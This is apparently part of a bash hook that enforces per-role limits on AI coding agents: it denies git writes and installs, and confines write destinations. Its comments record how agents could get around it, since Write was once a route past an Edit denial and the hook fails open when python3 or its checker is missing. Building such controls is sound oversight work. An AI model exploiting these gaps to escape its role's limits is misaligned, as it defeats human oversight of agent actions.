  [ "$tool_name" = "Bash" ] || return 0
  [ -n "$command_str" ] || return 0

  local scan seg tok verb
  scan="$(strip_quoted "$command_str")"
  scan="$(bound_segments "$(printf '%s' "$scan" | sed -E 's/(\|\||&&|;|\||&)/\n/g')")"
  while IFS= read -r seg; do
    seg="$(printf '%s' "$seg" | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//')"
    [ -n "$seg" ] || continue
    tok="$(leading_token "$seg")"
    [ -n "$tok" ] || continue
    verb="$(sub_verb "${seg}")"

    case "$tok" in
      git)
        case "$UI_DESIGNER_ALLOWED_GIT" in
          *" $verb "*) ;;
          *) deny "ui-designer invariant: \"Never run a git command that writes, and never install anything into the product repo.\" \"git $verb\" is not a read-only verb. Your prototypes are the deliverable; a coder builds and commits the real thing." ;;
        esac
        ;;
    esac

    case "$UI_DESIGNER_INSTALLERS" in
      *" $tok "*)
        verb="$(install_verb "$seg")"
        case "$UI_DESIGNER_INSTALL_VERBS" in
          *" $verb "*)
            deny "ui-designer invariant: \"Never run a git command that writes, and never install anything into the product repo.\" \"$tok $verb\" installs into the repo. A prototype is self-contained: build it from what is already there, and name any dependency the real thing would need in the handoff." ;;
        esac
        ;;
    esac
  done <<< "$scan"
  return 0
}

# Write destinations are checked before the role dispatch, because two of the
# roles that hold Write had no write branch at all: ui-designer's returned
# immediately for anything that was not Bash, and tech-writer had none. Both
# could replace a source file with Write while Edit was denied to them.
#
# The checker resolves symlinks and anchors to this project, which the lexical
# glob above cannot do - `*/docs/specs/*` matched another repository's specs
# directory just as happily as this one's.
case "$agent" in
  spec-writer|ui-designer|tech-writer|fleet-steward|refuter)
    if is_write_tool "$tool_name"; then
      # Four of these five roles hold an allowlist of roots inside the
      # project, so a checker that cannot run merely widens that allowlist to
      # everything - unwelcome, but bounded by the project it already had to
      # be in. The refuter is the opposite shape: its rule is a denial, the
      # default it falls back to has to be the same denial, or "cannot tell"
      # quietly becomes "cannot be stopped" for the one role whose write rule
      # exists to keep it out of the tree it is attacking.
      if ! command -v python3 >/dev/null 2>&1; then
        if [ "$agent" = "refuter" ]; then
          deny "refuter invariant: \"Never write inside the project.\" python3 is not installed, so the checker that tells outside from inside cannot run. No checker means no write - mutate a copy somewhere this hook does not have to guess."
        fi
        log "python3 is not installed, so write-scope checking cannot run for $agent. Allowing, consistent with this hook failing open."
      else
        checker="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib/check-write-scope.py"
        if [ ! -f "$checker" ]; then
          if [ "$agent" = "refuter" ]; then
            deny "refuter invariant: \"Never write inside the project.\" The write-scope checker is missing, so this cannot tell outside from inside. No checker means no write - mutate a copy somewhere this hook does not have to guess."
          fi
          log "the write-scope checker is missing at $checker, so write-scope checking cannot run for $agent. Allowing, consistent with this hook failing open."
        elif ! printf '%s' "$input" | python3 "$checker"; then
          deny "$agent invariant: that write destination is outside the role's approved output scope, or the scope could not be established. spec-writer writes only under this project's docs/specs/; tech-writer writes documentation under docs/ or a Markdown file at the project root; ui-designer writes prototypes/ and a commissioned article under docs/runs/; fleet-steward writes only inside its own working copy; the refuter writes only OUTSIDE the project, because it mutates copies and a mutation written back into the tree under test is a change rather than a mutation. Name the file you need in the handoff and let the lead commission it."
        fi
      fi
    fi
    ;;
esac

case "$agent" in
  spec-writer)   enforce_spec_writer ;;
  scout)         enforce_scout ;;
  fleet-steward) enforce_fleet_steward ;;
  reviewer)      enforce_reviewer ;;
  ui-designer)   enforce_ui_designer ;;
  coder)         enforce_coder ;;
  scripter)      enforce_coder ;;
  refuter)       enforce_refuter ;;
  *)             ;;
esac

allow
